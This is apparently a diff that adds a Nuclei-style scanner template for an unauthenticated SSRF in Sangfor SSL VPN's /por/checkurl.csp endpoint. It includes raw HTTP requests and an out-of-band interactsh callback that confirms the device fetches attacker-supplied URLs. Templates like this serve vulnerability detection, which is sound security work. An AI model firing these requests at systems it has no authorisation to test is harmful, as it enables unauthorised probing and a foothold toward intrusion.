@@ -1,0 +1,52 @@
+id: sangfor-sslvpn-rce
+info:
+  name: 深信服SSL VPN checkurl.csp SSRF/远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: sangfor,sangfor-sslvpn,ssrf,rce,por,checkurl
+  description: |
+    深信服SSL VPN /por/checkurl.csp 接口存在未过滤SSRF漏洞，攻击者可通过url参数诱导设备主动访问任意内外网地址，结合内网服务可实现远程代码执行，未授权即可利用。
+http:
+  - raw:
+      - |
+        GET /por/checkurl.csp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "2"
+    extractors:
+      - type: kval
+        kval:
+          - Host
+    stop-at-first-match: true
+
+  - raw:
+      - |
+        GET /por/checkurl.csp?url=http://{{interactsh-url}}&retry=0&timeout=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
